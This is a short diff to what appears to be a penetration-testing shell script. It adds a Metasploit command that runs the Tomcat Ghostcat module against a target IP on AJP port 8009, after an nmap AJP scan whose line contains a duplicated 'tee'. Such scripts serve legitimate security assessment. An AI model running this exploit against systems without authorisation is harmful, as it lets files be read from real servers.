@@ -177,6 +177,8 @@ echo -e $RED_LINE
   echo -e "${GREEN}+-----------------------------------+${RESET}"
   
 nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP | tee tee $results_dir/apache_ajp_results
+msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; spool $results_dir/apache_ajp_results; set rhosts $IP; run ;spool off ; exit"
+
 
 echo -e $RED_LINE
 
